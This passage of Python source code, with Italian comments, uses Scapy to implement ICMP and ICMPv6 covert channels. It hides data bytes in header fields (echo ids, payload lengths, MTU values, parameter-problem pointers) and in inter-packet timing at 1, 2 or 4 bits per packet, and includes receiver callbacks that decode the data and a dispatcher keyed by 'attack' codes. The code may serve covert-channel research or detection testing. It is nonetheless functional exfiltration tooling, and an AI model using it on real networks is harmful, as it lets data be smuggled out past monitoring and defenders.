        for piece_data in data: #BIG ENDIAN
            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
        start_time=datetime.datetime.now(datetime.timezone.utc)
        pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=interface)  
        for piece_bit_data in bit_data:
            for bit1, bit2,bit3,bit4 in zip(piece_bit_data[0::4], piece_bit_data[1::4],piece_bit_data[2::4], piece_bit_data[3::4]):
                index=bit1<<3 | bit2<<2 |  bit3<<1 | bit4  
                time.sleep(TEMPI_CODICI[index])  
                pkt= Ether(dst=target_mac)/ IP(dst=ip_dst.compressed)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
                pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=interface)  
            time.sleep(TEMPO_BYTE)
        end_time=datetime.datetime.now(datetime.timezone.utc) 
    
    def ipv4_timing_channel_8bit(data:bytes=None, ip_dst:ipaddress=None, min_delay:int=1, max_delay:int=30, stop_value: int = 255): 
        if not (IS_TYPE.bytes(data) and IS_TYPE.ipaddress(ip_dst) and IS_TYPE.integer(min_delay) and IS_TYPE.integer(max_delay) and IS_TYPE.integer(stop_value)):
            raise Exception("test_timing_channel8bit: Argomenti non validi") 
        if min_delay<=0: 
            raise Exception("Valori negativi o nulli non sono accettati")
        if max_delay<=min_delay: 
            raise Exception("Il vlaore masismo non può essere minore di quello minimo") 
        if not (0<=stop_value <=255): 
            raise Exception("Valore stop value non corretto")
        old_time=current_time=time.perf_counter() 
        target_mac = IP_INTERFACE.get_macAddress(ip_dst).strip().replace("-",":").lower() 
        interface=IP_INTERFACE.iface_from_IP(ip_dst) 
        print(f"MAC di destinazione: {target_mac}")
        print(f"Interfaccia per destinazione: {interface}")

        pkt = Ether(dst=target_mac)/IP(dst=ip_dst.compressed)/ICMP() / data 
        sendp(pkt, verbose=1, iface=interface) 
        for byte in data:   
            delay=min_delay+(byte/255)*(max_delay-min_delay)
            print(f"Delay :{byte}\t{delay}\n")
            #print(f"Data: {byte}\t{byte-31}\t{type(byte)}\n") 
            time.sleep(delay) 
            
            pkt = Ether(dst=target_mac)/IP(dst=ip_dst.compressed)/ICMP() / data 
            #print(f"Sending {pkt.summary()}") 
            sendp(pkt, verbose=1, iface=interface) 
    
    #-------------------------------------
    def ipv6_information_reply(data:bytes=None, addr_src:ipaddress.IPv6Address=None,addr_dst:ipaddress.IPv6Address=None): 
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(addr_src) or not IS_TYPE.ipaddress(addr_dst):
            raise Exception(f"Argoemnti non corretti")
        if addr_dst.version!=6:
            print(f"IP version is not 6: {addr_dst.version}")
            return False
        
        TYPE_INFORMATION_REQUEST=128
        TYPE_INFORMATION_REPLY=129 
        try:
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst)
            if interface is None:  
                interface=IP_INTERFACE.default_iface()
                ping_once(addr_dst,interface)
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst)
            if interface is None:
                raise Exception("Problema con l'interfaccia non risolto") 
        except Exception as e: 
            interface=IP_INTERFACE.default_iface() 
        
        dst_mac=IP_INTERFACE.mac_from_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
        src_mac = get_if_hwaddr(interface)
        
        for index in range(0, len(data), 2): 
            if index==len(data)-1 and len(data)%2!=0:
                icmp_id=(data[index]<<8) 
            else:
                icmp_id=(data[index]<<8)+data[index+1] 
            pkt= (
                 Ether(dst=dst_mac, src=src_mac)
                /IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)
                /ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=icmp_id)
            )
            #print(f"Sending {pkt.summary()}") 
            ans = sendp(pkt, verbose=1,iface=interface) 
        pkt= (
            Ether(dst=dst_mac, src=src_mac)
            /IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)
            /ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
            / Raw(load="Hello Neighbour".encode())
        )
        #print(f"Sending {pkt.summary()}") 
        ans = sendp(pkt, verbose=1,iface=interface) 
        if ans: 
            return True  
        return False 
    
    def ipv6_parameter_problem(data:bytes=None, addr_src:ipaddress.IPv6Address=None,addr_dst:ipaddress.IPv6Address=None): 
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(addr_src) or not IS_TYPE.ipaddress(addr_dst):
            raise Exception(f"Argoemnti non corretti")
        if addr_dst.version!=6:
            print(f"IP version is not 6: {addr_dst.version}")
            return False
        
        TYPE_PARAMETER_PROBLEM=4  
        TYPE_INFORMATION_REQUEST=128
        TYPE_INFORMATION_REPLY=129 
        try:
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst) 
            if interface is None:  
                interface=IP_INTERFACE.default_iface()
                ping_once(addr_dst,interface)
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst)
            if interface is None:
                raise Exception("Problema con l'interfaccia non risolto")  
        except Exception as e: 
            interface=IP_INTERFACE.default_iface() 
        dst_mac=IP_INTERFACE.mac_from_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
        src_mac = get_if_hwaddr(interface) 
        
        for index in range(0, len(data), 8):  
            dummy_pkt=(
                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=int.from_bytes(data[index+4:index+6]))  /
                ICMPv6EchoRequest(
                    type=TYPE_INFORMATION_REQUEST,
                    id=int.from_bytes(data[index+6:index+8]), 
                    seq=0
                )
            )
            pkt=(
                Ether(dst=dst_mac, src=src_mac) /
                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
                ICMPv6ParamProblem(ptr=int.from_bytes(data[index:index+4]),type=TYPE_PARAMETER_PROBLEM) /
                dummy_pkt
            ) 
            #print(f"Sending {pkt.summary()} through interface {interface}")  
            ans = sendp(pkt, verbose=1,iface=interface)  

        dummy_pkt=(
            IPerror6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
            ICMPv6EchoRequest(type=TYPE_INFORMATION_REQUEST, id=0, seq=1)
        )
        pkt=(
            Ether(dst=dst_mac, src=src_mac) /
            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
            ICMPv6ParamProblem(type=TYPE_PARAMETER_PROBLEM,ptr=0xFFFFFFFF) /
            dummy_pkt
        ) 
        #print(f"Sending {pkt.summary()} through interface {interface}")  
        ans = sendp(pkt, verbose=1,iface=interface) 
        if ans: 
            return True  
        return False  

    def ipv6_time_exceeded(data:bytes=None, addr_src:ipaddress.IPv6Address=None, addr_dst:ipaddress.IPv6Address=None): 
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(addr_src) or not IS_TYPE.ipaddress(addr_dst):
            raise Exception(f"Argoemnti non corretti")
        if addr_dst.version!=6:
            print(f"IP version is not 6: {addr_dst.version}")
            return False
        
        TYPE_TIME_EXCEEDED= 3
        TYPE_INFORMATION_REPLY=129 
        try:
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst) 
            if interface is None:  
                interface=IP_INTERFACE.default_iface()
                ping_once(addr_dst,interface)
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst)
            if interface is None:
                raise Exception("Problema con l'interfaccia non risolto")  
        except Exception as e: 
            interface=IP_INTERFACE.default_iface() 
        dst_mac=IP_INTERFACE.mac_from_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
        src_mac = get_if_hwaddr(interface) 
        
        for index in range(0, len(data), 4): 
            dummy_pkt=(
                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=int.from_bytes(data[index:index+2]))  /
                ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=int.from_bytes(data[index+2:index+4]), seq=0)
            )
            pkt=(
                Ether(dst=dst_mac, src=src_mac) /
                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
                ICMPv6TimeExceeded(type=TYPE_TIME_EXCEEDED) /
                dummy_pkt
            ) 
            #print(f"Sending {pkt.summary()} through interface {interface}")  
            ans = sendp(pkt, verbose=1,iface=interface)  
        
        dummy_pkt=(
            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=0xffff)  /
            ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
        )
        pkt=(
            Ether(dst=dst_mac, src=src_mac) /
            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
            ICMPv6TimeExceeded(type=TYPE_TIME_EXCEEDED) /
            dummy_pkt
        ) 
        #print(f"Sending {pkt.summary()} through interface {interface}")  
        ans = sendp(pkt, verbose=1,iface=interface) 
        if ans: 
            return True  
        return False
    
    def ipv6_packet_to_big(data:bytes=None, addr_src:ipaddress.IPv6Address=None, addr_dst:ipaddress.IPv6Address=None): 
        if not IS_TYPE.bytes(data) or not IS_TYPE.ip(addr_src) or not IS_TYPE.ipaddress(addr_dst):
            raise Exception(f"Argoemnti non corretti")
        if addr_dst.version!=6:
            print(f"IP version is not 6: {addr_dst.version}")
            return False
        
        TYPE_PKT_BIG= 2
        TYPE_INFORMATION_REQUEST=128
        TYPE_INFORMATION_REPLY=129  
        try:
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst) 
            if interface is None:  
                interface=IP_INTERFACE.default_iface()
                ping_once(addr_dst,interface)
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst)
            if interface is None:
                raise Exception("Problema con l'interfaccia non risolto")  
        except Exception as e: 
            interface=IP_INTERFACE.default_iface() 
        dst_mac=IP_INTERFACE.mac_from_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
        src_mac = get_if_hwaddr(interface)  
        
        for index in range(0, len(data), 8): 
            dummy_pkt=(
                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=int.from_bytes(data[index+4:index+6]))  /
                ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=int.from_bytes(data[index+6:index+8]), seq=0)
            )
            pkt=(
                Ether(dst=dst_mac, src=src_mac) /
                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
                ICMPv6PacketTooBig(type=TYPE_PKT_BIG, mtu=int.from_bytes(data[index:index+4])) /
                dummy_pkt
            ) 
            #print(f"Sending {pkt.summary()} through interface {interface}")  
            ans = sendp(pkt, verbose=1,iface=interface)  

        dummy_pkt=(
            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=0xffff)  /
            ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
        )
        pkt=(
            Ether(dst=dst_mac, src=src_mac) /
            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
            ICMPv6PacketTooBig(type=TYPE_PKT_BIG, mtu=0) /
            dummy_pkt
        ) 
        #print(f"Sending {pkt.summary()} through interface {interface}")  
        ans = sendp(pkt, verbose=1,iface=interface) 
        if ans: 
            return True  
        return False
    
    def ipv6_destination_unreachable(data:bytes=None, addr_src:ipaddress.IPv6Address=None, addr_dst:ipaddress.IPv6Address=None): 
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(addr_src) or not IS_TYPE.ipaddress(addr_dst):
            raise Exception(f"Argoemnti non corretti")
        if addr_dst.version!=6:
            print(f"IP version is not 6: {addr_dst.version}")
            return False
        
        TYPE_DESTINATION_UNREACHABLE=1 
        TYPE_INFORMATION_REQUEST=128
        TYPE_INFORMATION_REPLY=129 
        try:
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst) 
            if interface is None:  
                interface=IP_INTERFACE.default_iface()
                ping_once(addr_dst,interface)
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst)
            if interface is None:
                raise Exception("Problema con l'interfaccia non risolto")  
        except Exception as e: 
            interface=IP_INTERFACE.default_iface() 
        dst_mac=IP_INTERFACE.mac_from_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
        src_mac = get_if_hwaddr(interface) 

        for index in range(0, len(data), 4): 
            dummy_pkt=(
                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=int.from_bytes(data[index:index+2]))  /
                ICMPv6EchoReply(type=128,id=int.from_bytes(data[index+2:index+4]), seq=0)
            )
            pkt=(
                Ether(dst=dst_mac, src=src_mac) /
                IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
                ICMPv6DestUnreach(type=TYPE_DESTINATION_UNREACHABLE) /
                dummy_pkt
            ) 
            #print(f"Sending {pkt.summary()} through interface {interface}")  
            ans = sendp(pkt, verbose=1,iface=interface)  
        dummy_pkt=(
            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed, plen=0xffff)  /
            ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
        )
        pkt=(
            Ether(dst=dst_mac, src=src_mac) /
            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed)  /
            ICMPv6DestUnreach(type=TYPE_DESTINATION_UNREACHABLE) /
            dummy_pkt
        ) 
        #print(f"Sending {pkt.summary()} through interface {interface}")  
        ans = sendp(pkt, verbose=1,iface=interface) 
        if ans: 
            return True  
        return False

    def ipv6_timing_channel_1bit(data:bytes=None, addr_src:ipaddress.IPv6Address=None, addr_dst:ipaddress.IPv6Address=None): #Exec Time 0:14:46
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore 
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(addr_src) or not IS_TYPE.ipaddress(addr_dst):
            raise Exception(f"Argoemnti non corretti")
        if addr_dst.version!=6:
            print(f"IP version is not 6: {addr_dst.version}")
            return False
        
        TEMPO_0=3 #sec
        DISTANZA_TEMPI=2 #sec
        TEMPO_1=8 #sec
        if TEMPO_0+DISTANZA_TEMPI*2>=TEMPO_1: 
            raise ValueError("send_timing_channel: TEMPO_1 non valido")
        TEMPO_BYTE=0*60 #minuti

        TYPE_INFORMATION_REQUEST=128
        TYPE_INFORMATION_REPLY=129
        
        try:
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst) 
            if interface is None:  
                interface=IP_INTERFACE.default_iface()
                ping_once(addr_dst,interface)
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst)
            if interface is None:
                raise Exception("Problema con l'interfaccia non risolto")  
        except Exception as e: 
            interface=IP_INTERFACE.default_iface() 
        dst_mac=IP_INTERFACE.mac_from_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
        src_mac = get_if_hwaddr(interface) 
        
        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0) 
        bit_data=[]
        for piece_data in data: #BIG ENDIAN
            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)]
        
        start_time=datetime.datetime.now(datetime.timezone.utc) 
        pkt= (
            Ether(dst=dst_mac, src=src_mac) /
            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed) /
            ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
            Raw(load="Hello Neighbour".encode())
        ) 
        #print(f"Sending {pkt.summary()} through interface {interface}")  
        ans = sendp(pkt, verbose=1,iface=interface)  
        for piece_bit_data in bit_data:
            for bit in piece_bit_data:
                if bit: 
                    time.sleep(TEMPO_1) 
                else: 
                    time.sleep(TEMPO_0)
                current_time=datetime.datetime.now(datetime.timezone.utc)
                pkt= (
                    Ether(dst=dst_mac, src=src_mac) /
                    IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed) /
                    ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
                    Raw()
                ) 
                #print(f"Sending {pkt.summary()} through interface {interface}")  
                ans = sendp(pkt, verbose=1,iface=interface) 
            time.sleep(TEMPO_BYTE)
        end_time=datetime.datetime.now(datetime.timezone.utc) 
    
    def ipv6_timing_channel_2bit(data:bytes=None, addr_src:ipaddress.IPv6Address=None, addr_dst:ipaddress.IPv6Address=None): #Exec Time 12:08
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(addr_src) or not IS_TYPE.ipaddress(addr_dst):
            raise Exception(f"Argoemnti non corretti")
        if addr_dst.version!=6:
            print(f"IP version is not 6: {addr_dst.version}")
            return False
        
        DISTANZA_TEMPI=2 #sec
        TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(2**2)] #00, 01, 10, 11
        #TEMPO_00=3, TEMPO_01=TEMPO_00+2*DISTANZA_TEMPI, TEMPO_10=TEMPO_01+2*DISTANZA_TEMPI, TEMPO_11=TEMPO_10+2*DISTANZA_TEMPI
        TEMPO_BYTE=0*60 #minuti  
        
        TYPE_INFORMATION_REQUEST=128
        TYPE_INFORMATION_REPLY=129

        try:
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst) 
            if interface is None:  
                interface=IP_INTERFACE.default_iface()
                ping_once(addr_dst,interface)
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst)
            if interface is None:
                raise Exception("Problema con l'interfaccia non risolto")  
        except Exception as e: 
            interface=IP_INTERFACE.default_iface() 
        dst_mac=IP_INTERFACE.mac_from_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
        src_mac = get_if_hwaddr(interface) 
        
        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)  
        bit_data=[]
        for piece_data in data: #BIG ENDIAN
            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)]
            
        start_time=datetime.datetime.now(datetime.timezone.utc)
        pkt= (
            Ether(dst=dst_mac, src=src_mac) /
            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed) /
            ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
            Raw()
        ) 
        #print(f"Sending {pkt.summary()} through interface {interface}")  
        ans = sendp(pkt, verbose=1,iface=interface)  
        for piece_bit_data in bit_data:
            for bit1, bit2 in zip(piece_bit_data[0::2], piece_bit_data[1::2]): 
                time.sleep(TEMPI_CODICI[(bit1<<1)+bit2]) 
                current_time=datetime.datetime.now(datetime.timezone.utc)
                pkt= (
                    Ether(dst=dst_mac, src=src_mac) /
                    IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed) /
                    ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
                    Raw()
                ) 
                #print(f"Sending {pkt.summary()} through interface {interface}")  
                ans = sendp(pkt, verbose=1,iface=interface)  
            time.sleep(TEMPO_BYTE)
        end_time=datetime.datetime.now(datetime.timezone.utc) 
    
    def ipv6_timing_channel_4bit(data:bytes=None, addr_src:ipaddress.IPv6Address=None, addr_dst:ipaddress.IPv6Address=None): #Exec Time 0:22:20.745110 
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
        if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(addr_src) or not IS_TYPE.ipaddress(addr_dst):
            raise Exception(f"Argoemnti non corretti")
        if addr_dst.version!=6:
            print(f"IP version is not 6: {addr_dst.version}")
            return False
        
        DISTANZA_TEMPI=2 #sec
        TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(4**2)] #0000, 0001, 0010, 0011,...,1111
        TEMPO_BYTE=0*60 #minuti 
        
        TYPE_INFORMATION_REQUEST=128
        TYPE_INFORMATION_REPLY=129
        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
        try:
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst) 
            if interface is None:  
                interface=IP_INTERFACE.default_iface()
                ping_once(addr_dst,interface)
            interface,_= IP_INTERFACE.iface_from_IP(addr_dst)
            if interface is None:
                raise Exception("Problema con l'interfaccia non risolto")  
        except Exception as e: 
            interface=IP_INTERFACE.default_iface() 
        dst_mac=IP_INTERFACE.mac_from_ipv6(addr_dst.compressed, addr_src.compressed, interface)  
        src_mac = get_if_hwaddr(interface) 
        
        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)  
        bit_data=[]
        for piece_data in data: #BIG ENDIAN
            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
        
        start_time=datetime.datetime.now(datetime.timezone.utc)
        pkt= (
            Ether(dst=dst_mac, src=src_mac) /
            IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed) /
            ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
            Raw()
        ) 
        #print(f"Sending {pkt.summary()} through interface {interface}")  
        ans = sendp(pkt, verbose=1,iface=interface)  
        for piece_bit_data in bit_data:
            for bit1, bit2,bit3,bit4 in zip(piece_bit_data[0::4], piece_bit_data[1::4],piece_bit_data[2::4], piece_bit_data[3::4]):
                index=bit1<<3 | bit2<<2 |  bit3<<1 | bit4  
                time.sleep(TEMPI_CODICI[index])  
                pkt= (
                    Ether(dst=dst_mac, src=src_mac) /
                    IPv6(dst=f"{addr_dst.compressed}%{interface}",src=addr_src.compressed) /
                    ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
                    Raw()
                ) 
                #print(f"Sending {pkt.summary()} through interface {interface}")  
                ans = sendp(pkt, verbose=1,iface=interface)
            time.sleep(TEMPO_BYTE)
        end_time=datetime.datetime.now(datetime.timezone.utc) 

#-----------------------------------------------------------------------
def wait_data(attack_function:dict, ip_dst:ipaddress.IPv4Address=None, information_data:list=[], ip_src:ipaddress.IPv4Address=None): 
    #print(f"Waiting data with attack function: {attack_function}") 
    if not IS_TYPE.dictionary(attack_function) or not IS_TYPE.ipaddress(ip_dst) or not IS_TYPE.list(information_data): 
        raise Exception("Argomenti non validi")
    print("CCCCCCCC",ip_dst,file=sys.stderr)
    singleton=ReceiveSingleton() 
    attack_code=next(iter(attack_function.items()))[0]
    try:
        match attack_code:
            case "ipv4_12"|"ipv4_information_reply"|"ipv4_11"|"ipv4_information_request": 
                return singleton.ipv4_information_request(ip_dst, information_data, ip_src)
            case "ipv4_19"|"ipv4_timestamp_reply"|"ipv4_9"|"ipv4_timestamp_request": 
                return singleton.ipv4_timestamp_request(ip_dst, information_data, ip_src)
            case "ipv4_3"|"ipv4_redirect": 
                return singleton.ipv4_redirect(ip_dst, information_data, ip_src)
            case "ipv4_2"|"ipv4_source_quench": 
                return singleton.ipv4_source_quench(ip_dst, information_data, ip_src)
            case "ipv4_8"|"ipv4_parameter_problem":  
                return singleton.ipv4_parameter_problem(ip_dst, information_data, ip_src) 
            case "ipv4_7"|"ipv4_time_exceeded": 
                return singleton.ipv4_time_exceeded(ip_dst, information_data, ip_src)
            case "ipv4_1"|"ipv4_destination_unreachable": 
                print("BBBBBB",ip_dst,file=sys.stderr) 
                try:
                    return singleton.ipv4_destination_unreachable(ip_dst, information_data, ip_src)
                except Exception as e:
                    print(f"wait_data Eccezione 2: {e}")
            case "ipv4_4"|"ipv4_timing_channel_1bit": 
                return singleton.ipv4_timing_cc(ip_dst, 1, information_data, ip_src)  
            case "ipv4_5"|"ipv4_timing_channel_2bit": 
                return singleton.ipv4_timing_cc(ip_dst, 2, information_data, ip_src) 
            case "ipv4_6"|"ipv4_timing_channel_4bit": 
                return singleton.ipv4_timing_cc(ip_dst, 4, information_data, ip_src) 
        
            case "ipv6_9"|"ipv6_information_reply"|"ipv6_8"|"ipv6_information_request": 
                return singleton.ipv6_information_request(ip_dst, information_data, ip_src)
            case "ipv6_4"|"ipv6_parameter_problem": 
                return singleton.ipv6_parameter_problem(ip_dst, information_data, ip_src)
            case "ipv6_3"|"ipv6_time_exceeded": 
                return singleton.ipv6_time_exceeded(ip_dst, information_data, ip_src)
            case "ipv6_2"|"ipv6_packet_to_big": 
                return singleton.ipv6_packet_to_big(ip_dst, information_data, ip_src)
            case "ipv6_1"|"ipv6_destination_unreachable": 
                return singleton.ipv6_destination_unreachable(ip_dst, information_data, ip_src)
            case "ipv6_5"|"ipv6_timing_channel_1bit": 
                return singleton.ipv6_timing_cc(ip_dst, 1, information_data, ip_src) 
            case "ipv6_6"|"ipv6_timing_channel_2bit": 
                return singleton.ipv6_timing_cc(ip_dst, 2, information_data, ip_src) 
            case "ipv6_7"|"ipv6_timing_channel_4bit": 
                return singleton.ipv6_timing_cc(ip_dst, 3, information_data, ip_src) 
        print("Caso non conemplato")
        return None
    except Exception as e:
        print(f"wait_data Eccezione: {e}")

class CALLBACK():
    def callback_v6_timing_cc(callback_function, event_pktconn, timer, timing_data=[], previous_time=None, numero_bit=0 ):   
            if numero_bit<=0:
                return None   
        
            DISTANZA_TEMPI=2 #sec
            dict_tempi={}
            dict_tempi.update( [("TEMPO_"+str(index), 3+index*2*DISTANZA_TEMPI)  for index in range(2**numero_bit)])
            dict_bit={ }
            dict_bit.update([ ("TEMPO_"+str(index), index)  for index in range(2**numero_bit) ])  

            MINUTE_TIME=0*60+30 #minuti
            MAX_TIME=max([value for _,value in dict_tempi.items()])+5 
        
            def callback(packet):
                nonlocal previous_time, timer,timing_data, event_pktconn, callback_function
                nonlocal MAX_TIME, MINUTE_TIME  
                if previous_time is None: 
                    previous_time=packet.time 
                    timer.cancel()
                    timer=GET.timer(MAX_TIME,callback_function) 
                    timer.start() 
                    return  
                if packet.time is not None: 
                    delta_time=packet.time-previous_time   
                    arr=arr=[(key, abs(delta_time-value)) for key,value in dict_tempi.items()] 
                    min_value=min([y for _,y in arr]) 
                    min_indices = [i for i, v in enumerate(arr) if v[1] == min_value] 
                    timing_data.append(dict_bit.get(arr[min_indices[0]][0]))
                    previous_time=packet.time
                    timer.cancel() 
                    if len(timing_data)%8==0: 
                        timer=GET.timer(MINUTE_TIME,callback_function) 
                    else:
                        timer=GET.timer(MAX_TIME,callback_function) 
                    timer.start()
            return callback

    def callback_v6_destination_unreachable(event_pktconn,data ):
            TYPE_DESTINATION_UNREACHABLE=3 
            def callback(packet): 
                field=None 
                if (layer:=packet.getlayer("IPv6")) is not None:  
                    if (layer:=layer.getlayer("ICMPv6DestUnreach")) is None: 
                        return
                    if (layer:=layer.getlayer("IPerror6")) is not None: 
                        if (field:=layer.getfieldval("plen")) is not None and field!=0xffff: 
                            data.append(field.to_bytes(2,"big").decode())
                        elif field is not None and field==0xffff: 
                            THREADING_EVENT.set(event_pktconn)
                            return
                    layer=(
                        layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
                        else layer.getlayer("ICMPv6EchoReply")
                    )
                    if layer is not None: 
                        if (field:=layer.getfieldval("id")) is not None and not (field==0 and layer.getfieldval("seq")==1): 
                            data.append(field.to_bytes(2,"big").decode()) 
                        elif field is not None and (field==0 and layer.getfieldval("seq")==1): 
                            THREADING_EVENT.set(event_pktconn)
                            return 
            return callback

    def callback_v6_packet_to_big(event_pktconn,data ):
            TYPE_PKT_BIG= 2
            def callback(packet): 
                field=None 
                if (layer:=packet.getlayer("IPv6")) is not None:  
                    if (layer:=layer.getlayer("ICMPv6PacketTooBig")) is not None: 
                        if (field:=layer.getfieldval("mtu")) is not None: 
                            data.append(field.to_bytes(4,"big").decode()) 
                    if (layer:=layer.getlayer("IPerror6")) is not None: 
                        if (field:=layer.getfieldval("plen")) is not None and field!=0xffff: 
                            data.append(field.to_bytes(2,"big").decode())
                        elif field is not None and field==0xffff: 
                            THREADING_EVENT.set(event_pktconn)
                            return
                    layer=(
                        layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
                        else layer.getlayer("ICMPv6EchoReply")
                    )
                    if layer is not None: 
                        if (field:=layer.getfieldval("id")) is not None and not (field==0 and layer.getfieldval("seq")!=0): 
                            data.append(field.to_bytes(2,"big").decode()) 
                        elif field is not None and (field==0 and layer.getfieldval("seq")==1): 
                            THREADING_EVENT.set(event_pktconn)
                            return
                        #else: print("Caso non considetrato")  
            return callback

    def callback_v6_time_exceeded(event_pktconn,data ):
            TYPE_TIME_EXCEEDED=3  
            def callback(packet): 
                field=None 
                if (layer:=packet.getlayer("IPv6")) is not None:  
                    if (layer:=layer.getlayer("IPerror6")) is not None: 
                        if (field:=layer.getfieldval("plen")) is not None and field!=0xffff: 
                            data.append(field.to_bytes(2,"big").decode())
                        elif field is not None and field==0xffff: 
                            THREADING_EVENT.set(event_pktconn)
                            return
                    layer=(
                        layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
                        else layer.getlayer("ICMPv6EchoReply")
                    )
                    if layer is not None: 
                        if (field:=layer.getfieldval("id")) is not None and not (field==0 and layer.getfieldval("seq")!=0): 
                            data.append(field.to_bytes(2,"big").decode()) 
                        elif field is not None and (field==0 and layer.getfieldval("seq")==1): 
                            THREADING_EVENT.set(event_pktconn)
                            return 
            return callback

    def callback_v6_parameter_problem(event_pktconn,data ): 
